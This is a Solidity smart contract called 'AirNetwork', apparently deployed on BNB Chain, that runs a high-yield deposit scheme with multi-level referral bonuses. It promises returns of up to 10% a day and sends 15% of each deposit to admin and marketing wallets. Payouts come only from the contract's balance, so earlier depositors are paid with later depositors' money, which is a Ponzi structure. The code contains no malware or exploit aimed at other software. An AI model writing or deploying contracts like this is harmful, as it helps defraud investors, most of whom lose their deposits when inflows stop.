/**
 *Submitted for verification at BscScan.com on 2022-02-26
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function subz(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b >= a) {
            return 0;
        }
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract AirNetwork {
	using SafeMath for uint256;

	uint256[] private REFERRAL_PERCENTS = [30, 20, 10, 5, 5, 5, 5];
	uint256[] private NITRO_PERCENTS = [60, 105, 150];
	uint256[] private NITRO_PRICE    = [30, 50, 70];
	uint256 constant private INVEST_MIN = 0.1 ether; 
	uint256 constant private INVEST_MAX = 1000 ether; 
	uint256 constant private WITHDRAW_MIN = 0.2 ether; 
	uint256 constant private WITHDRAW_MAX = 100 ether; 
	uint256 constant private TOTAL_REF = 100;
	uint256 constant private ADMIN_FEE = 100;
	uint256 constant private MARKETING_FEE = 50;
	uint256 constant private REINVEST_BONUS = 40;
	uint256 constant private HOLD_BONUS = 5;
	uint256 constant private HOLD_BONUS_MAX = 100;
	uint256 constant private PERCENTS_DIVIDER = 1000;
	uint256 constant private TIME_STEP = 1 days;
	uint256 constant public NITRO_DAYS = 3 * TIME_STEP; 
	uint256 constant public WITHDRAW_TIME_STEP = 2 * TIME_STEP; 

	uint256 public totalInvested;
	uint256 public totalReferral;
	uint256 public totalUsers;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 status;
        uint8 plan;
		uint256 amount;
		uint256 start;
		uint256 startReinvest;
		uint256 checkpoint;
		uint256 reserved;
		uint256 reinvested;
		uint256 nitro;
		bool nitroStatus;
	}

	struct User {
		Deposit[] deposits;
		address referrer;
		uint256[7] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
	}

	mapping (address => User) internal users;

	uint256 public startDate;

	address payable public adminWallet;
	address payable public marketingWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event Nitro(address indexed user, uint256 amount, uint256 time);
	event WithdrawnRef(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

    receive() payable external {
    }

	constructor(address payable adminAddr, address payable marketingAddr, uint256 start) {
		require(!isContract(adminAddr) && !isContract(marketingAddr));
		adminWallet = adminAddr;
		marketingWallet = marketingAddr;

		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}

        plans.push(Plan(10000, 10));
        plans.push(Plan(30, 100));
        plans.push(Plan(60, 70));
	}

	function invest(address referrer, uint8 plan) public payable {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(msg.value >= INVEST_MIN,"less than min amount");
		require(msg.value <= INVEST_MAX,"greater than max amount");
        require(plan < 3, "Invalid plan");

		uint256 admin = msg.value.mul(ADMIN_FEE).div(PERCENTS_DIVIDER);
		uint256 marketing = msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
		adminWallet.transfer(admin);
		marketingWallet.transfer(marketing);
		emit FeePayed(msg.sender, admin.add(marketing));

		User storage user = users[msg.sender];


		if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);

			//referral
			if (user.referrer == address(0)) {
				if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
					user.referrer = referrer;
				}

				address upline = user.referrer;
				for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
					if (upline != address(0)) {
						users[upline].levels[i] = users[upline].levels[i].add(1);
						upline = users[upline].referrer;
					} else break;
				}
			}

			if (user.referrer != address(0)) {
				address upline = user.referrer;
				for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
					if (upline != address(0)) {
						uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
						users[upline].bonus = users[upline].bonus.add(amount);
						users[upline].totalBonus = users[upline].totalBonus.add(amount);
						totalReferral = totalReferral.add(amount);
						emit RefBonus(upline, msg.sender, i, amount);
						upline = users[upline].referrer;
					} else break;
				}
			}
		}

		uint256 finish = (block.timestamp).add(plans[plan].time.mul(TIME_STEP));
		user.deposits.push(Deposit(0, plan, msg.value, block.timestamp, finish, block.timestamp, 0, 0, 0, false));
		totalInvested = totalInvested.add(msg.value);
		emit NewDeposit(msg.sender, plan, msg.value, block.timestamp);
	}

	function withdraw(uint256 index) public {
		User storage user = users[msg.sender];
		require(index < user.deposits.length,"Invalid index");
		require(user.deposits[index].status < 2,"deposit was finished");
		require(user.deposits[index].checkpoint.add(WITHDRAW_TIME_STEP) < block.timestamp, "only once each two days");
		uint256 totalAmount = getDepositDividends(msg.sender, index);
		user.deposits[index].reserved = 0;

		//hold bonus
		if(user.deposits[index].status == 0 && user.deposits[index].checkpoint <= user.deposits[index].start ){
			uint256 hold = getDepositHoldBonus(msg.sender, index);
			if(hold > 0){
				totalAmount = totalAmount.add(hold);
			}
		}

		require(totalAmount >= WITHDRAW_MIN,"less than min amount");
		if(totalAmount > WITHDRAW_MAX){
			user.deposits[index].reserved = totalAmount.subz(WITHDRAW_MAX);
			totalAmount = WITHDRAW_MAX;
		}

		//reinvest
		if(user.deposits[index].status == 0 && user.deposits[index].plan > 0 && user.deposits[index].plan < 3){
			uint256 reinvestAmount = totalAmount.mul(REINVEST_BONUS).div(PERCENTS_DIVIDER);
			user.deposits[index].reinvested = user.deposits[index].reinvested.add(reinvestAmount);
			uint256 admin = reinvestAmount.mul(ADMIN_FEE).div(PERCENTS_DIVIDER);
			adminWallet.transfer(admin);
			emit FeePayed(msg.sender, admin);
			totalAmount = totalAmount.sub(reinvestAmount);
		}

		//Nitro
		uint256 nitro = getDepositNitro(msg.sender, index);
		if(nitro > 0 && user.deposits[index].nitroStatus == false){
			user.deposits[index].nitroStatus = true;
			totalAmount = totalAmount.add(nitro);
		}

		uint256 contractBalance = getContractBalance();
		if (contractBalance < totalAmount) {
			user.deposits[index].reserved = user.deposits[index].reserved.add(totalAmount.sub(contractBalance));
			totalAmount = contractBalance;
		}

		user.deposits[index].checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		uint256 finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
		uint256 finishReinvest = user.deposits[index].startReinvest.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
		if(block.timestamp > finishReinvest && user.deposits[index].status == 1){
			user.deposits[index].status = 2;
		}
		else if(block.timestamp > finish){
			user.deposits[index].status = 1;
			user.deposits[index].startReinvest = block.timestamp;
		}

		payable(msg.sender).transfer(totalAmount);
		emit Withdrawn(msg.sender, totalAmount, block.timestamp);
	}
	
	function withdrawReferral() public {
		User storage user = users[msg.sender];
		uint256 referralBonus = getUserReferralBonus(msg.sender);
		require(referralBonus > 0, "no referral commission");
		user.bonus = 0;
		uint256 contractBalance = getContractBalance();
		if (contractBalance < referralBonus) {
			user.bonus = user.bonus.add(referralBonus.sub(contractBalance));
			referralBonus = contractBalance;
		}
		payable(msg.sender).transfer(referralBonus);
		emit WithdrawnRef(msg.sender, referralBonus, block.timestamp);
	}

	function runNitro(uint256 depositIndex, uint256 nitroIndex) public payable {
		User storage user = users[msg.sender];
		require(nitroIndex < NITRO_PRICE.length,"Invalid index");
		require(depositIndex < user.deposits.length,"Invalid index");
		require(user.deposits[depositIndex].status == 0,"deposit was finished");
		require(user.deposits[depositIndex].nitro == 0,"nitro is used");
		require(user.deposits[depositIndex].plan > 0 && user.deposits[depositIndex].plan < 3 ,"only plans 2 and 3 is allowed");

		uint256 nitroPrice = user.deposits[depositIndex].amount.mul(NITRO_PRICE[nitroIndex]).div(PERCENTS_DIVIDER);
		require(nitroPrice <= msg.value, "invalid price");

		uint256 admin = nitroPrice.mul(ADMIN_FEE).div(PERCENTS_DIVIDER);
		adminWallet.transfer(admin);
		emit FeePayed(msg.sender, admin);

		uint256 nitroAmount = user.deposits[depositIndex].amount.mul(NITRO_PERCENTS[nitroIndex]).div(PERCENTS_DIVIDER);
		user.deposits[depositIndex].nitro = nitroAmount;
		emit Nitro(msg.sender, nitroAmount, block.timestamp);
	}

	function getNitroPrice(address userAddr, uint256 depositIndex, uint256 nitroIndex) public view returns (uint256) {
		User storage user = users[userAddr];
		require(nitroIndex < NITRO_PRICE.length,"Invalid index");
		require(depositIndex < user.deposits.length,"Invalid index");
		require(user.deposits[depositIndex].status == 0,"deposit was finished");
		require(user.deposits[depositIndex].nitro == 0,"nitro is used");
		require(user.deposits[depositIndex].plan > 0 && user.deposits[depositIndex].plan < 3 ,"only plans 2 and 3 is allowed");

		uint256 nitroPrice = user.deposits[depositIndex].amount.mul(NITRO_PRICE[nitroIndex]).div(PERCENTS_DIVIDER);
		return nitroPrice;
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getDepositHoldBonus(address userAddress, uint256 index) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalAmount;
		uint256 plan = user.deposits[index].plan;

		if(user.deposits[index].status == 0){
			uint256 finish = user.deposits[index].start.add(plans[plan].time.mul(TIME_STEP));
			if(block.timestamp > finish && user.deposits[index].checkpoint <= user.deposits[index].start){
				uint256 share = user.deposits[index].amount.mul(HOLD_BONUS).div(PERCENTS_DIVIDER);
				uint256 from = finish;
				uint256 to = block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					if(totalAmount > user.deposits[index].amount.mul(HOLD_BONUS_MAX).div(PERCENTS_DIVIDER)){
						totalAmount = user.deposits[index].amount.mul(HOLD_BONUS_MAX).div(PERCENTS_DIVIDER);
					}
				}
			}
		}

		return totalAmount;
	}

	function getDepositNitro(address userAddress, uint256 index) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalAmount = 0;
		if(user.deposits[index].nitroStatus == false && user.deposits[index].nitro > 0 
		&& block.timestamp > user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP))){
			totalAmount = user.deposits[index].nitro;
		}
		return totalAmount;
	}

	function getDepositDividends(address userAddress, uint256 index) public view returns (uint256) {
		User storage user = users[userAddress];
		Deposit storage deposit = user.deposits[index];

		uint256 totalAmount = deposit.reserved;
		uint256 plan = deposit.plan;

		if(deposit.status == 0){
			uint256 finish = deposit.start.add(plans[plan].time.mul(TIME_STEP));
			if (deposit.checkpoint < finish) {
				uint256 share = deposit.amount.mul(plans[plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = deposit.start > deposit.checkpoint ? deposit.start : deposit.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}
		else if(deposit.status == 1){
			uint256 finish = deposit.startReinvest.add(plans[plan].time.mul(TIME_STEP));
			uint256 start = deposit.startReinvest;
			uint256 checkPoint = deposit.checkpoint;
			if (checkPoint < finish) {
				uint256 share = (deposit.amount.mul(plans[plan].percent).div(PERCENTS_DIVIDER)).mul(REINVEST_BONUS).div(PERCENTS_DIVIDER);
				uint256 from = start > checkPoint ? start : checkPoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalAmount = 0;
		for (uint256 i = 0; i < user.deposits.length; i++) {
			totalAmount = totalAmount.add(getDepositDividends(userAddress, i));
			uint256 nitro = getDepositNitro(userAddress, i);
			if(nitro > 0){
				totalAmount = totalAmount.add(nitro);
			}
		}
		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[7] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(Deposit memory) {
	    User storage user = users[userAddress];
		Deposit storage deposit = user.deposits[index];
		return deposit;
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus, uint256 _totalUsers) {
		return(totalInvested, totalReferral, totalUsers);
	}

	function getUserInfo(address userAddress) public view returns( uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals
	, uint256 claimableReferral, uint256 totalReferralReward) {
		return(getUserTotalDeposits(userAddress), 
		getUserTotalWithdrawn(userAddress), 
		getUserTotalReferrals(userAddress),
		getUserReferralBonus(userAddress),
		getUserReferralTotalBonus(userAddress)
		);
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}